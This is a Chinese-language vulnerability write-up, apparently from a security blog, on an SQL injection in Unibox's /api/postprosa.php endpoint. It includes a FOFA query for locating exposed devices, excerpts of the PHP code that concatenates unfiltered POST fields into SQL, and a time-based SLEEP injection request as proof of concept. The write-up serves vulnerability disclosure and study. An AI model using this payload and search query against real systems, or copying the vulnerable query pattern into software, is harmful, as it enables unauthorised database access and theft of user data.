---
title: "Unibox postprosa.php sql注入漏洞"
source: https://mrxn.net/jswz/unibox-api-postprosa-sqli.html
asset_dir: assets/unibox-postprosa.php-sql注入漏洞
---

# Unibox postprosa.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/21 08:10
- 902浏览
- [0评论](#comment)
- 35分钟阅读

深入探索

网络安全培训

安全认证考试

文本剥离工具

---

# 漏洞简介

unibox是一款网络管理设备，提供多种网络管理功能和服务。unibox的 `/api/postprosa.php` 接口处存在SQL注入漏洞，攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

代码安全审计

# 影响版本

# fofa语法

> `body="UniBox" || body="UniBox" && body="id=\"index-body\""`

# 漏洞分析

看下 `api/postprosa.php` 的关键业务实现部分

```
<?php

$prosa_response         = $_POST["EM_Response"];
$prosa_total                 = $_POST["EM_Total"];
$prosa_returnOrderID         = $_POST["EM_OrderID"];
$prosa_merchant         = $_POST["EM_Merchant"];
$prosa_store                 = $_POST["EM_Store"];
$prosa_term                 = $_POST["EM_Term"];
$prosa_refNum                 = $_POST["EM_RefNum"];
$prosa_auth                 = $_POST["EM_Auth"];
$prosa_returnDigest         = $_POST["EM_Digest"];

......

if( !empty( $prosa_returnDigest ) )
{
    if($prosa_response != "" )
    {
       switch($prosa_response) {
          case "approved" :
             $prosa_respcode = 1;
             $paymentstatus = 1;
             $proceed = 1;

             $query = "SELECT id,Prosa_OrderId FROM bill_prosa_transaction WHERE Prosa_OrderId = '$prosa_returnOrderID';";
             if($DEBUG_ON)   { debug_line($fp, "\nQuery for duplicate transaction:- ".$query."\n"); }
             $result = @mysql_db_query($mysql_database,$query,$dblink); 
             if($result &&  (@mysql_num_rows($result) > 0))
             {
                $row = @mysql_fetch_array($result);
                $prosa_returnOrderID = $row[ProsaOrderId];
                $duplicateTransaction = 1;
             }
                     $msg = "Transaction Successful";
             break;
          case "denied" :
             $prosa_respcode = 2;
                                $paymentstatus = 0;
                                $msg = "Error: Transaction Denied.";
                                break;

          case "Duplicated transaction" :
             $prosa_respcode = 2;
                                $paymentstatus = 0;
                                $msg = "Error: Duplicate Transaction.";
                                break;

          case "Incorrect information is provided." : //Incorrect information is provided
             $prosa_respcode = 2;
             $paymentstatus = 0;
             $msg = "Error: Incorrect Information is provided.";
             break;

       }  

// 示例1：SELECT 查询
$query = "SELECT id,Prosa_OrderId FROM bill_prosa_transaction WHERE Prosa_OrderId = '$prosa_returnOrderID';";
$result = @mysql_db_query($mysql_database,$query,$dblink);

// 示例2：INSERT 查询
$query = "INSERT INTO bill_prosa_transaction ... VALUES ... '$prosa_merchant', '$prosa_store', ...);";
$result = @mysql_db_query($mysql_database,$query,$dblink);

// 未过滤的用户输入
$prosa_returnOrderID = $_POST["EM_OrderID"];
$prosa_merchant      = $_POST["EM_Merchant"];
$prosa_store         = $_POST["EM_Store"];
// 直接拼接至 SQL 查询（注入点）
$query = "SELECT id,Prosa_OrderId FROM bill_prosa_transaction WHERE Prosa_OrderId = '$prosa_returnOrderID';";
$result = @mysql_db_query($mysql_database,$query,$dblink);
// 其他注入点（INSERT 操作）
$query = "INSERT INTO bill_prosa_transaction ... VALUES ... '$prosa_merchant', '$prosa_store', ...);";
$result = @mysql_db_query($mysql_database,$query,$dblink);
```

用户输入的多个参数（如 EM\_OrderID、EM\_Merchant 等）未经任何过滤直接拼接到SQL查询中，导致攻击者可执行任意SQL命令。

漏洞修复方案

# 漏洞复现

```
POST /api/postprosa.php HTTP/1.1
Host: unibox.mrxn.net
Content-Type: application/x-www-form-urlencoded

EM_Digest=11&EM_Response=approved&EM_OrderID=1' AND (SELECT 1337 FROM (SELECT(SLEEP(2)))xasd)-- -
```

成功延时 6 秒（执行三次）

[![Unibox postprosa.php sql注入漏洞](images/img-001-22f3f64156a4.webp)](https://image.mrxn.net/82af6ad6bc1a4137b268aec9ab053364.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
